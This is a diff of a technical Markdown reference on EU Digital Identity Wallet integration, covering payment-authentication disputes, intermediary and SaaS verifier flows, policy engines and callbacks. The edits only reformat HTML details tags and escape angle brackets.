@@ -16559,7 +17005,8 @@ The Dutch PA's paper was published in May 2025, five months **after** TS12 v1.0 
 
 </details>
 
-<details><summary><strong>Dispute 4 ⚠️ PARTIAL: "PSPs are not required to issue EAAs"</strong></summary>
+<details>
+<summary><strong>Dispute 4 ⚠️ PARTIAL: "PSPs are not required to issue EAAs"</strong></summary>
 
 The Dutch PA argued that "there is no requirement for relying parties to issue EAAs" and that "if a payment use case necessitates that PSPs issue EAAs to function, it will always be considered a beyond-compliance use case."
 
@@ -16571,7 +17018,8 @@ The Use Case Manual 11 (*Payment Authentication*) confirms: PSPs issue SCA attes
 
 </details>
 
-<details><summary><strong>Dispute 5 ⚠️ PARTIAL: "POS/contactless are out of scope; LSP solutions are voluntary"</strong></summary>
+<details>
+<summary><strong>Dispute 5 ⚠️ PARTIAL: "POS/contactless are out of scope; LSP solutions are voluntary"</strong></summary>
 
 The Dutch PA argued two related points: (1) only transactions "online from both a technical and user experience perspective" are in scope, excluding POS terminals and contactless; (2) LSP solutions are voluntary and cannot be imposed on the ecosystem.
 
@@ -16583,7 +17031,8 @@ On **LSP solutions**: The LSP solutions are not legally binding. However, the EC
 
 </details>
 
-<details><summary><strong>Dispute 6 🔵 OPEN: "TPPs must have equal access to SCA exemptions via the wallet"</strong></summary>
+<details>
+<summary><strong>Dispute 6 🔵 OPEN: "TPPs must have equal access to SCA exemptions via the wallet"</strong></summary>
 
 The **European Third Party Providers Association** (ETPPA) has argued that PISPs and AISPs must be able to use, in a non-discriminatory manner, the same SCA exemptions available to the account-servicing PSP (ASPSP) when using the wallet flow. Their core position is that SCA should attach to the *execution* phase (controlled by the ASPSP) rather than the *initiation* phase (triggered by the TPP), and that the wallet must not create new friction for TPP-mediated flows.
 
@@ -16593,7 +17042,8 @@ The ETPPA's concern is legitimate but legislative. eIDAS 2.0 does not itself add
 
 </details>
 
-<details><summary><strong>Dispute 7 🔄 IN PROGRESS: "Card payments need a separate flow: EMV 3DS integration"</strong></summary>
+<details>
+<summary><strong>Dispute 7 🔄 IN PROGRESS: "Card payments need a separate flow: EMV 3DS integration"</strong></summary>
 
 The card payment industry (EMVCo, Visa, Mastercard) has identified the need for a "**merchant-captured authentication**" flow where the EUDI Wallet integrates with the EMV 3-D Secure protocol. In this model, the merchant (not the issuer) initiates wallet authentication on their website; the cardholder authenticates via the wallet; and the merchant relays the outcome to the card issuer via 3DS for final validation.
 
@@ -16613,7 +17063,8 @@ PSPs with card-issuing operations must plan for **both** integration paths. The 
 
 </details>
 
-<details><summary><strong>Dispute 8 ✅ SETTLED: "The wallet is just for SCA: banks don't need it for KYC/onboarding"</strong></summary>
+<details>
+<summary><strong>Dispute 8 ✅ SETTLED: "The wallet is just for SCA: banks don't need it for KYC/onboarding"</strong></summary>
 
 Some banking industry voices have argued that the Art. 5f(2) obligation is narrowly scoped to SCA, and that banks are not required to accept the wallet for Customer Due Diligence (CDD) / Know Your Customer (KYC) onboarding.
 
@@ -16834,7 +17285,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Intermediated RP requests presentation from Intermediary</strong></summary>
+<details>
+<summary><strong>1. Intermediated RP requests presentation from Intermediary</strong></summary>
 
 The Intermediated RP (e.g., an e-commerce platform or a small bank without its own EUDI integration) calls the Intermediary's session initiation API to request a credential presentation. The API call specifies: (a) the attributes needed (e.g., `family_name`, `given_name`, `birth_date`), (b) the credential format (`dc+sd-jwt` or `mso_mdoc`), (c) the Intermediated RP's registered identifier (LEI or national ID), and (d) the intended use under which the request is authorised.
 
@@ -16843,7 +17295,8 @@ The Intermediary acts as a **technical proxy** — it has its own WRPAC and mana
 **Artifact Produced:** Intermediary session initiation request payload (JSON) containing `credentials` and `intended_use_id`.
 
 </details>
-<details><summary><strong>2. Intermediary builds JAR with WRPAC and Intermediated RP identity</strong></summary>
+<details>
+<summary><strong>2. Intermediary builds JAR with WRPAC and Intermediated RP identity</strong></summary>
 
 The Intermediary constructs the OpenID4VP Authorization Request (JAR). Crucially, it signs the JAR with its own WRPAC private key, but includes the identity of the Intermediated RP in a request extension.
 
@@ -16900,21 +17353,23 @@ JWS header — signed with the **Intermediary's** WRPAC:
   "alg": "ES256",
   "typ": "oauth-authz-req+jwt",
   "x5c": [
-    "<Intermediary WRPAC certificate DER>",
-    "<Access CA intermediate>"
+    "&lt;Intermediary WRPAC certificate DER>",
+    "&lt;Access CA intermediate>"
   ]
 }
 ```
 
 </details>
-<details><summary><strong>3. Intermediary sends OpenID4VP request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>3. Intermediary sends OpenID4VP request to Wallet Unit</strong></summary>
 
 The Intermediary delivers the signed JAR to the User's Wallet Unit using the same mechanisms as direct RP flows: DC API (same-device, §9.2 step 6), QR code (cross-device, §10.2 step 6), or push notification. The `response_uri` points to the **Intermediary's** backend (`https://verifier.signicat.com/oid4vp/callback`), not the Intermediated RP — all presentation responses flow through the Intermediary.
 
 > **response_uri domain**: The `response_uri` must match the domain authorised by the Intermediary's WRPAC SAN. The Intermediated RP's domain is irrelevant for response routing — the Wallet sends the JWE to the Intermediary, which then forwards verified attributes to the Intermediated RP.
 
 </details>
-<details><summary><strong>4. Wallet Unit authenticates Intermediary via WRPAC chain</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit authenticates Intermediary via WRPAC chain</strong></summary>
 
 The Wallet verifies the Intermediary's WRPAC certificate chain (from the JAR's `x5c` header) against the Access CA LoTE trust anchor, identical to §9.2 steps 8–10. The WRPAC identifies the **Intermediary** entity (e.g., *"Signicat AS"*), not the end Intermediated RP — this is a key distinction. The Wallet knows it is interacting with a third-party verification service, not the business the User is actually engaging with.
 
@@ -16925,14 +17380,16 @@ The Wallet also verifies the JAR's `client_id` matches the Intermediary's WRPAC 
 **Audit Telemetry:** The Wallet logs an `INTERMEDIARY_WRPAC_VALIDATION_FAILED` alert locally.
 
 </details>
-<details><summary><strong>5. Wallet Unit extracts Intermediated RP identity from request extension</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit extracts Intermediated RP identity from request extension</strong></summary>
 
 The Wallet extracts the `intermediated_rp` extension from the JAR payload (step 2). This extension contains: `name` (localised display name), `identifier` (LEI or national registration number), `registrar_uri` (the Registrar API endpoint for this RP's Member State), and `intended_use_id` (the registered use case). The Wallet will display this identity on the consent screen (step 9) alongside the Intermediary's identity.
 
 > **Trust model**: The Intermediary's WRPAC signature over the JAR (including the `intermediated_rp` extension) creates an implicit assertion: *"I, the Intermediary, certify that I am acting on behalf of this Intermediated RP."* The Wallet relies on this assertion and verifies it against the Registrar (steps 6–8).
 
 </details>
-<details><summary><strong>6. Wallet Unit verifies WRPRC for Intermediated RP</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit verifies WRPRC for Intermediated RP</strong></summary>
 
 If the JAR includes a WRPRC (Wallet Relying Party Registration Certificate) for the Intermediated RP, the Wallet verifies it cryptographically. The WRPRC is issued by the Registrar and contains the Intermediated RP's registration details: `legalName`, `intended_use`, supported credential types and claims. The Wallet checks:
 
@@ -16948,7 +17405,8 @@ If the JAR includes a WRPRC (Wallet Relying Party Registration Certificate) for 
 **Audit Telemetry:** The Wallet logs a `WRPRC_POLICY_VIOLATION` event.
 
 </details>
-<details><summary><strong>7. Wallet Unit queries Registrar for Intermediated RP data</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit queries Registrar for Intermediated RP data</strong></summary>
 
 If no WRPRC is available, the Wallet queries the National Registration Infrastructure (Registrar API) using the identifier to dynamically fetch the Intermediated RP's registration data and intended use permissions.
 
@@ -16962,7 +17420,8 @@ Accept: application/jwt
 ```
 
 </details>
-<details><summary><strong>8. Registrar returns registration data to Wallet Unit</strong></summary>
+<details>
+<summary><strong>8. Registrar returns registration data to Wallet Unit</strong></summary>
 
 The Registrar responds with a signed JWT assertion (§3.4.4 step 4) confirming: (a) the Intermediated RP is registered, (b) it is authorised to request the specified claims under the stated intended use, and (c) it has designated the querying Intermediary as an authorised proxy. The response may also include the RP's `srvDescription` (localised service description) for display on the consent screen.
 
@@ -16971,7 +17430,8 @@ The Registrar responds with a signed JWT assertion (§3.4.4 step 4) confirming: 
 **Artifact Produced:** Signed JWT assertion from Registrar API containing validated Intermediated RP metadata.
 
 </details>
-<details><summary><strong>9. Wallet Unit displays both Intermediary and RP identities to User</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit displays both Intermediary and RP identities to User</strong></summary>
 
 The Wallet constructs a **dual-identity consent screen** (Art. 5a(4)(b)) that clearly distinguishes the two entities involved:
 
@@ -16984,14 +17444,16 @@ The Wallet constructs a **dual-identity consent screen** (Art. 5a(4)(b)) that cl
 This dual-identity display is the key UX element that distinguishes the Intermediary model from the Direct model. The User must understand that their data will first pass through the Intermediary before reaching the Intermediated RP.
 
 </details>
-<details><summary><strong>10. User approves data release to Intermediated RP via Intermediary</strong></summary>
+<details>
+<summary><strong>10. User approves data release to Intermediated RP via Intermediary</strong></summary>
 
 The User reviews the dual-identity consent screen and approves the data release. The User authenticates via biometric or PIN (LoA High) to unlock the WSCA for KB-JWT signing. The User's consent covers: (a) release of the specified attributes, (b) routing through the named Intermediary, and (c) delivery to the named Intermediated RP.
 
 > **User awareness**: The User should understand that the Intermediary will momentarily hold their data in memory during verification and forwarding. The consent screen should make this data routing transparent.
 
 </details>
-<details><summary><strong>11. Wallet Unit builds encrypted response with vp_token</strong></summary>
+<details>
+<summary><strong>11. Wallet Unit builds encrypted response with vp_token</strong></summary>
 
 The Wallet builds the `vp_token` (SD-JWT VC with selected disclosures and KB-JWT, or mdoc `DeviceResponse`), encrypts it into a JWE using the Intermediary's ephemeral ECDH-ES public key from the JAR's `response_encryption_jwk`, identical to §9.2 steps 16–17. The KB-JWT's `aud` claim is set to the **Intermediary's** `client_id` (not the Intermediated RP's), since the Intermediary is the entity that will verify it.
 
@@ -17000,12 +17462,14 @@ The Wallet builds the `vp_token` (SD-JWT VC with selected disclosures and KB-JWT
 **Artifact Produced:** JWE-encrypted `vp_token` (SD-JWT VC or mdoc) structurally addressed to the Intermediary's ephemeral key.
 
 </details>
-<details><summary><strong>12. Wallet Unit POSTs encrypted response to Intermediary</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit POSTs encrypted response to Intermediary</strong></summary>
 
 The Wallet POSTs the JWE to the Intermediary's `response_uri` (`https://verifier.signicat.com/oid4vp/callback`), identical to §9.2 step 18. The response goes to the **Intermediary**, not the Intermediated RP. The Intermediary's backend correlates the response with the pending session using the `state` parameter.
 
 </details>
-<details><summary><strong>13. Intermediary decrypts JWE and verifies presentation</strong></summary>
+<details>
+<summary><strong>13. Intermediary decrypts JWE and verifies presentation</strong></summary>
 
 The Intermediary performs the complete verification pipeline — the same verification an RP would do in the Direct model:
 
@@ -17023,7 +17487,8 @@ The Intermediary bears the full verification responsibility — the Intermediate
 **Audit Telemetry:** The Intermediary MUST log an `INTERMEDIARY_VERIFICATION_FAILED` alert to its SIEM.
 
 </details>
-<details><summary><strong>14. Intermediary extracts attributes (MUST NOT store content data)</strong></summary>
+<details>
+<summary><strong>14. Intermediary extracts attributes (MUST NOT store content data)</strong></summary>
 
 The Intermediary extracts the verified attribute values (e.g., `family_name: "Müller"`, `given_name: "Anna"`, `birth_date: "1990-03-15"`) into an in-memory data structure. **Article 5b(10)** of Regulation 910/2014 imposes a strict legal obligation: the Intermediary *"shall not store the content of the transaction data"*. This means:
 
@@ -17037,7 +17502,8 @@ The Intermediary extracts the verified attribute values (e.g., `family_name: "M�
 **Artifact Produced:** Ephemeral in-memory attribute object (purged immediately after forwarding per Art. 5b(10)).
 
 </details>
-<details><summary><strong>15. Intermediary forwards verified attributes to Intermediated RP</strong></summary>
+<details>
+<summary><strong>15. Intermediary forwards verified attributes to Intermediated RP</strong></summary>
 
 The Intermediary transmits the verified attributes to the Intermediated RP's backend via the pre-configured delivery channel. Common mechanisms (see §26.6.1 for full analysis):
 
@@ -17050,7 +17516,8 @@ The forwarded payload typically includes: the verified attribute values, a verif
 **Artifact Produced:** L2 Callback Payload (Signed JWT) containing verified attributes and verification dimensions.
 
 </details>
-<details><summary><strong>16. Intermediated RP processes received attributes</strong></summary>
+<details>
+<summary><strong>16. Intermediated RP processes received attributes</strong></summary>
 
 The Intermediated RP receives the verified attributes from the Intermediary and processes them within its business logic layer — CDD onboarding (§22), account creation, age verification, or identity matching. From this point, the flow continues identically to a Direct RP model: the RP creates an authenticated session, updates its records, and redirects the User.
 
@@ -17198,14 +17665,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Wallet Unit submits VP Token to Verification Policy Engine</strong></summary>
+<details>
+<summary><strong>1. Wallet Unit submits VP Token to Verification Policy Engine</strong></summary>
 
 The Wallet POSTs the VP Token (containing the SD-JWT VC or mdoc presentation) to the verification platform's `/verify` endpoint. This is the L1 protocol callback — the `direct_post` response arrives at the verifier's `response_uri`. At this stage, the VP Token is an opaque, encrypted JWE payload. The policy engine decrypts it using the session's ephemeral private key and prepares the credential for the static policy chain. The Wallet's role ends here — it has no visibility into the policy evaluation that follows.
 
 **Artifact Produced:** Encrypted VP Token JWE containing the presented SD-JWT VC or mdoc payload.
 
 </details>
-<details><summary><strong>2. Policy Engine verifies credential signature</strong></summary>
+<details>
+<summary><strong>2. Policy Engine verifies credential signature</strong></summary>
 
 The first static check: the policy engine extracts the Issuer-JWT (SD-JWT VC) or IssuerAuth COSE_Sign1 (mdoc) and verifies the digital signature against the LoTE trust anchor. This confirms the credential was issued by a trusted PID Provider or Attestation Provider and has not been tampered with in transit.
 
@@ -17216,26 +17685,30 @@ The first static check: the policy engine extracts the Issuer-JWT (SD-JWT VC) or
 **Artifact Produced:** Cryptographic verification result (Boolean pass/fail) and parsed payload claims.
 
 </details>
-<details><summary><strong>3. Policy Engine checks credential expiry</strong></summary>
+<details>
+<summary><strong>3. Policy Engine checks credential expiry</strong></summary>
 
 The second static check: the engine validates that the current time falls within the credential's `nbf`–`exp` window. Expired credentials are rejected regardless of all other checks. For short-lived credentials (SD-JWT VCs with 24-hour validity), this check is time-critical and requires accurate server clock synchronisation (NTP).
 
 </details>
-<details><summary><strong>4. Policy Engine checks revocation via TokenStatusList</strong></summary>
+<details>
+<summary><strong>4. Policy Engine checks revocation via TokenStatusList</strong></summary>
 
 The third static check: the engine queries the Token Status List (draft-ietf-oauth-status-list) at the index specified in the credential's `status` claim. A non-zero value at the index indicates revocation. See Annex B.3 for the full status resolution flow. These three static checks are deterministic and require no external input beyond the LoTE cache and Status List cache. They execute in milliseconds and are identical across all RP tenants on the platform. If any static check fails, the pipeline short-circuits — no webhook delegation occurs.
 
 **Artifact Produced:** Resolved TokenStatusList object evaluated from the Status List cache.
 
 </details>
-<details><summary><strong>5. Policy Engine delegates decision to External Service via webhook</strong></summary>
+<details>
+<summary><strong>5. Policy Engine delegates decision to External Service via webhook</strong></summary>
 
 If all static checks pass and the RP has configured a Dynamic policy (§26.1.1 Tier 3) with a webhook target, the policy engine forwards the disclosed attributes to the external service — for example, the RP's AML screening endpoint. The request includes the `credential_type` and the specific attribute values (e.g., `family_name`, `given_name`, `birth_date`) needed for the screening decision. This decoupling allows RPs to inject business-specific rules (AML, age thresholds, jurisdiction restrictions) without modifying the verification platform itself.
 
 **Artifact Produced:** Outbound JSON webhook payload containing `credential_type` and explicitly extracted plain-text attributes.
 
 </details>
-<details><summary><strong>6. External Service returns screening result</strong></summary>
+<details>
+<summary><strong>6. External Service returns screening result</strong></summary>
 
 The external service (e.g., AML screening, sanctions list check) performs its domain-specific logic and returns a synchronous JSON response with a pass/fail decision. The policy engine treats this as another link in the policy chain — if the webhook returns `"pass": false`, the overall verification fails even though all cryptographic checks passed.
 
@@ -17248,7 +17721,8 @@ The external service (e.g., AML screening, sanctions list check) performs its do
 **Artifact Produced:** Inbound webhook response JSON containing the `{"pass": boolean}` screening decision.
 
 </details>
-<details><summary><strong>7. Policy Engine delivers aggregated result to Wallet Unit</strong></summary>
+<details>
+<summary><strong>7. Policy Engine delivers aggregated result to Wallet Unit</strong></summary>
 
 The policy engine aggregates the results from all tiers — static checks (signature, expiry, revocation) and dynamic checks (webhook delegation) — into a single verification decision. The result is returned to the Wallet via the OpenID4VP response mechanism (`redirect_uri` or `response_code`). In a SaaS deployment, this result is also delivered to the RP via the L2 callback (§26.6.2).
 
@@ -17355,29 +17829,34 @@ The **legal** distinction between models depends on **whose WRPAC signs the JAR*
 | **D. Direct RP (browser DC API)** | RP | N/A — no `response_uri` | RP (via browser platform API) | ✅ Yes |
 | **E. Direct RP (native app OS Credential API)** | RP | N/A — no `response_uri` | RP (via OS CredentialManager / PassKit) | ✅ Yes |
 
-<details><summary><strong>Model A — Direct RP (self-hosted verifier)</strong></summary>
+<details>
+<summary><strong>Model A — Direct RP (self-hosted verifier)</strong></summary>
 
 The RP deploys its own verifier (e.g., self-hosted walt.id, Procivis on-prem, or a custom implementation). The RP's backend *is* the verifier — the Wallet's `direct_post` arrives directly at the RP's `response_uri` endpoint. This is **not** a reverse proxy — it is simply a backend endpoint on the RP's server. No L2 callback is needed because the RP already has the VP Token.
 
 </details>
-<details><summary><strong>Model B — Direct RP (SaaS verifier)</strong></summary>
+<details>
+<summary><strong>Model B — Direct RP (SaaS verifier)</strong></summary>
 
 The RP delegates protocol execution to a cloud-hosted verifier API (e.g., walt.id Cloud, Paradym SaaS) but remains the **legal RP**. The SaaS verifier signs the JAR with the RP's WRPAC (the RP's private key is either hosted in the SaaS provider's HSM or accessed remotely). The Wallet sees the RP's identity, not the SaaS provider's. The SaaS verifier is a **technical service provider**, not a legal intermediary — it has no WRPAC of its own. L2 callbacks are required to deliver verification results back to the RP.
 
 **Key custody obligation:** If the SaaS provider hosts the RP's WRPAC private key in its own HSM, this constitutes outsourcing of a critical cryptographic function. Under ETSI TS 119 475, the WRPAC private key must be stored in a secure cryptographic device (QSCD or equivalent). Under DORA Art. 28 (for financial-sector RPs), outsourcing critical ICT functions to the SaaS provider triggers third-party risk management obligations — the RP must contractually ensure appropriate key protection, audit rights, and incident notification. RPs that require full key sovereignty should prefer an RP-controlled remote HSM model (the SaaS verifier signs via an HSM API call to the RP's infrastructure) over a SaaS-hosted key model.
 
 </details>
-<details><summary><strong>Model C — Intermediary</strong></summary>
+<details>
+<summary><strong>Model C — Intermediary</strong></summary>
 
 The intermediary is a **separate legal entity** with its own WRPAC (Art. 5b(10)). The Wallet's consent screen shows both the intermediary's and the end-RP's identity. The intermediary verifies the credential and forwards verified attributes to the end-RP via L2 callback. The end-RP cannot independently verify the original credential. See §25 for the full intermediary architecture.
 
 </details>
-<details><summary><strong>Model D — Direct RP (browser DC API)</strong></summary>
+<details>
+<summary><strong>Model D — Direct RP (browser DC API)</strong></summary>
 
 The RP uses the W3C Digital Credentials API (DC API) in a **browser context** with response mode `dc_api.jwt` (HAIP 1.0 §6.2). The VP Token flows through the **browser platform API** — there is no `response_uri`, no HTTP POST to a verifier backend, and no L2 callback. The browser acts as the secure conduit between the Wallet and the RP's origin. The RP receives the VP Token directly in the browser context via `navigator.credentials.get()` and validates it server-side. This model eliminates the entire callback architecture — L1, L2, and L3 are all inapplicable. Model D is the preferred model for same-device browser-based flows because it provides phishing resistance via origin validation and avoids the `response_uri` domain binding question entirely.
 
 </details>
-<details><summary><strong>Model E — Direct RP (native app OS Credential API)</strong></summary>
+<details>
+<summary><strong>Model E — Direct RP (native app OS Credential API)</strong></summary>
 
 The RP is a **native mobile application** (e.g., a banking app, insurance app, or government services app) that invokes the EUDI Wallet directly via the **OS-level credential manager API**: Android `CredentialManager` with `GetDigitalCredentialOption` (`androidx.credentials` 1.6+), or iOS PassKit "Verify with Wallet" / `IdentityDocumentProvider` framework (iOS 26+). Architecturally identical to Model D: no `response_uri`, no L1/L2/L3 callbacks. The OS acts as the trusted mediator — it discovers installed wallets, presents a system UI selector, and routes the OpenID4VP request to the user-selected wallet. The wallet handles consent and biometric authorization, then returns the VP Token to the calling app via the OS credential API. The native RP app validates the VP Token itself (or delegates to its own backend). Model E is the preferred model for **native mobile RP applications** because it provides OS-mediated wallet discovery (pre-flight credential matching), phishing resistance (the wallet knows the request came from the OS, not an arbitrary app), and a seamless UX without browser redirects or deep links. See §9.4 for platform-specific implementation details.
 
@@ -17467,12 +17946,14 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User Browser initiates verification request to RP Backend</strong></summary>
+<details>
+<summary><strong>1. User Browser initiates verification request to RP Backend</strong></summary>
 
 The User clicks a *"Verify with EUDI Wallet"* button on the RP's website or app. The RP's frontend sends an AJAX or form `POST` to the RP's own backend — at this point, neither the User nor the browser knows that a SaaS verifier will handle the OpenID4VP protocol. The RP's backend only needs to know: which credentials to request, and where to receive the result. All protocol-level complexity (JAR construction, nonce management, ECDH key generation, response decryption) is delegated to the verifier.
 
 </details>
-<details><summary><strong>2. RP Backend creates verification session on SaaS Verifier</strong></summary>
+<details>
+<summary><strong>2. RP Backend creates verification session on SaaS Verifier</strong></summary>
 
 The RP calls the SaaS verifier's API (`POST /openid4vc/verify`) with the DCQL query specifying which credentials are needed, plus a `statusCallbackUri` (the RP's webhook endpoint) and `statusCallbackApiKey` (for authenticating incoming callbacks). This is the key integration point — the RP delegates the entire OpenID4VP protocol to the SaaS verifier.
 
@@ -17495,7 +17976,8 @@ The RP calls the SaaS verifier's API (`POST /openid4vc/verify`) with the DCQL qu
 ```
 
 </details>
-<details><summary><strong>3. SaaS Verifier returns session ID and authorization request URI to RP Backend</strong></summary>
+<details>
+<summary><strong>3. SaaS Verifier returns session ID and authorization request URI to RP Backend</strong></summary>
 
 The verifier creates the complete OpenID4VP session internally — generating the JAR (signed with the verifier-held WRPAC, or the RP's WRPAC if key-managed by the verifier), a cryptographic `nonce`, an ephemeral ECDH key pair for response encryption, and a `response_uri` pointing to the verifier's own callback endpoint. The verifier returns:
 
@@ -17507,7 +17989,8 @@ The RP never constructs the JAR, manages ephemeral keys, or configures `response
 **Artifact Produced:** Session definition JSON payload returning the `session_id` and the generated `authorization_request_uri`.
 
 </details>
-<details><summary><strong>4. RP Backend renders authorization request to User Browser</strong></summary>
+<details>
+<summary><strong>4. RP Backend renders authorization request to User Browser</strong></summary>
 
 The RP's backend returns the `authorization_request_uri` to the frontend, which renders it according to the flow type:
 
@@ -17517,19 +18000,22 @@ The RP's backend returns the `authorization_request_uri` to the frontend, which 
 The RP's frontend code is identical regardless of which SaaS verifier is used — it only needs to render a URI. This is the L1 abstraction: the RP treats the `authorization_request_uri` as an opaque link.
 
 </details>
-<details><summary><strong>5. User Browser delivers authorization request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>5. User Browser delivers authorization request to Wallet Unit</strong></summary>
 
 The User scans the QR code (cross-device) or the browser invokes the Wallet via the DC API (same-device). The Wallet fetches the JAR from the `request_uri`, verifies the JWS signature against the WRPAC `x5c` chain, and parses the DCQL query. From the Wallet's perspective, it is interacting with whichever entity's WRPAC signed the JAR — either the SaaS verifier's own WRPAC or the RP's WRPAC (depending on the key management model, §22.6.2 step 2 note).
 
 </details>
-<details><summary><strong>6. Wallet Unit displays consent screen to User</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit displays consent screen to User</strong></summary>
 
 The Wallet displays the consent screen showing: the RP's identity (extracted from the WRPAC Subject/SAN), the requested attributes (e.g., `family_name`, `given_name`, `birth_date`), and the purpose (from WRPRC or Registrar). If the SaaS verifier uses **its own** WRPAC (not the RP's), the consent screen shows the verifier's identity — which may confuse Users who expect to see the RP's name. This is why the Intermediary model (§25.2) with dual-identity display exists as a regulated alternative.
 
 > **WRPAC ownership matters**: In the Direct SaaS model, the WRPAC holder determines what the User sees on the consent screen. If the SaaS verifier manages the RP's WRPAC (key custodianship), the User sees the RP's name. If the verifier uses its own WRPAC, the User sees the verifier — which functionally becomes an Intermediary and should follow the §25.2 regulatory model.
 
 </details>
-<details><summary><strong>7. Wallet Unit submits VP Token to SaaS Verifier via `direct_post`</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit submits VP Token to SaaS Verifier via `direct_post`</strong></summary>
 
 The Wallet POSTs the `vp_token` (wrapped in a `direct_post.jwt` JWE) to the `response_uri` hosted by the SaaS verifier — **not** the RP. This is the L1 (protocol-layer) callback: the Wallet communicates exclusively with the verifier. The RP never sees the raw OpenID4VP response, the JWE, or the SD-JWT/mdoc payload. This architectural separation means the RP does not need to implement any OpenID4VP response handling, JWE decryption, or credential format parsing.
 
@@ -17540,7 +18026,8 @@ The Wallet POSTs the `vp_token` (wrapped in a `direct_post.jwt` JWE) to the `res
 **Artifact Produced:** JWE-encrypted `vp_token` wrapper POSTed to the SaaS Verifier's `response_uri`.
 
 </details>
-<details><summary><strong>8. SaaS Verifier executes verification pipeline</strong></summary>
+<details>
+<summary><strong>8. SaaS Verifier executes verification pipeline</strong></summary>
 
 The verifier decrypts the JWE (using the session's ephemeral private key) and runs the full verification pipeline (§12 / §26.1.1):
 
@@ -17554,18 +18041,20 @@ The verifier decrypts the JWE (using the session's ephemeral private key) and ru
 These are the Static and Parameterized policy tiers (§26.1.1). The verifier applies them uniformly across all RP tenants.
 
 </details>
-<details><summary><strong>9. SaaS Verifier evaluates dynamic policy chain</strong></summary>
+<details>
+<summary><strong>9. SaaS Verifier evaluates dynamic policy chain</strong></summary>
 
 If the RP has configured Dynamic policies (§26.1.1 Tier 3), the verifier evaluates them after the cryptographic verification. Dynamic policies can include:
 
 - **L3 webhook delegations** — the verifier sends disclosed attributes to an external endpoint (e.g., the RP's AML screening service at `https://rp.example.com/aml-check`) and waits for a pass/fail response
-- **Custom rules** — e.g., *"accept PID only from DE, NL, FR issuers"*, *"require age_over_18 = true"*, *"reject if birth_date indicates age < 16"*
+- **Custom rules** — e.g., *"accept PID only from DE, NL, FR issuers"*, *"require age_over_18 = true"*, *"reject if birth_date indicates age &lt; 16"*
 - **Cross-credential matching** — if multiple credentials were presented (combined presentation, §18.5.8), the verifier can check consistency (e.g., same `personal_identifier` across PID and mDL)
 
 The policy chain result (all tiers: static + parameterized + dynamic) is aggregated into a final verification decision: `SUCCESS`, `FAILED`, or `REQUIRES_REVIEW`.
 
 </details>
-<details><summary><strong>10. SaaS Verifier delivers result to RP Backend via L2 callback</strong></summary>
+<details>
+<summary><strong>10. SaaS Verifier delivers result to RP Backend via L2 callback</strong></summary>
 
 The verifier POSTs the verification result to the RP's `statusCallbackUri` with the `statusCallbackApiKey` as a `Bearer` token in the `Authorization` header. The callback payload includes:
 
@@ -17580,7 +18069,8 @@ This L2 (operational) callback is the bridge between the SaaS verifier's OpenID4
 **Artifact Produced:** L2 operational callback payload (JSON) specifying the session outcome and decrypted attribute values.
 
 </details>
-<details><summary><strong>11. RP Backend processes verification result</strong></summary>
+<details>
+<summary><strong>11. RP Backend processes verification result</strong></summary>
 
 The RP validates the incoming callback: (a) verifies the `statusCallbackApiKey` Bearer token matches the expected value, (b) matches the `session_id` to a pending verification session in the RP's state store, (c) checks for duplicate callbacks (idempotency). The RP then extracts the disclosed attributes and applies its business logic — CDD onboarding (§22), age verification, SCA (§15), or identity matching.
 
@@ -17591,7 +18081,8 @@ The RP stores the verification outcome, attribute values, and the verifier's `se
 **Audit Telemetry:** The RP Backend MUST instantly log an `L2_CALLBACK_VALIDATION_FAILED` severe alert.
 
 </details>
-<details><summary><strong>12. RP Backend redirects User Browser to authenticated page</strong></summary>
+<details>
+<summary><strong>12. RP Backend redirects User Browser to authenticated page</strong></summary>
 
 The RP updates the User's browser session. The mechanism depends on the flow type:
 
@@ -17663,19 +18154,21 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User Browser initiates verification request to End-RP Backend</strong></summary>
+<details>
+<summary><strong>1. User Browser initiates verification request to End-RP Backend</strong></summary>
 
 The User clicks a "Verify Identity" button on the end-RP's website. From the User's perspective, this is identical to the direct SaaS model (§26.6.2 step 1) — the User is unaware that an intermediary is involved until the consent screen (step 6) reveals both entities. The RP's frontend sends a standard AJAX or form `POST` to the RP's own backend to initiate the verification flow. The RP's backend determines which intermediary to delegate to based on its configuration (the RP may use different intermediaries for different credential types or jurisdictions).
 
 </details>
-<details><summary><strong>2. End-RP Backend creates verification session on Intermediary</strong></summary>
+<details>
+<summary><strong>2. End-RP Backend creates verification session on Intermediary</strong></summary>
 
 The RP calls the intermediary's session creation endpoint, providing the information needed for the intermediary to construct the OpenID4VP authorization request on the RP's behalf:
 
 ```json
 POST /verify HTTP/1.1
 Host: intermediary.example.eu
-Authorization: Bearer <rp_api_key>
+Authorization: Bearer &lt;rp_api_key>
 Content-Type: application/json
 
 {
@@ -17706,7 +18199,8 @@ The `rp_id` tells the intermediary which end-RP to identify in the JAR's `rp_inf
 **Artifact Produced:** Session initiation `POST /verify` configuration API payload (JSON) specifying `rp_id` and intended use.
 
 </details>
-<details><summary><strong>3. Intermediary returns session ID and redirect URI to End-RP Backend</strong></summary>
+<details>
+<summary><strong>3. Intermediary returns session ID and redirect URI to End-RP Backend</strong></summary>
 
 The intermediary generates the OpenID4VP authorization request, signing the JAR with its **own WRPAC** (not the end-RP's — this is the key architectural distinction from the direct SaaS model). The JAR includes an `rp_info` extension identifying the end-RP to the Wallet (§25.2 step 2). The intermediary stores the session state (associating the `session_id` with the end-RP's `callbackUri` and `rp_id`) and returns:
 
@@ -17724,21 +18218,24 @@ The RP receives either a `redirect_uri` (for same-device) or a `qr_code_uri` (fo
 **Artifact Produced:** Session response payload returning `session_id` alongside the pre-configured authorization interaction URIs.
 
 </details>
-<details><summary><strong>4. End-RP Backend redirects User Browser to intermediary flow</strong></summary>
+<details>
+<summary><strong>4. End-RP Backend redirects User Browser to intermediary flow</strong></summary>
 
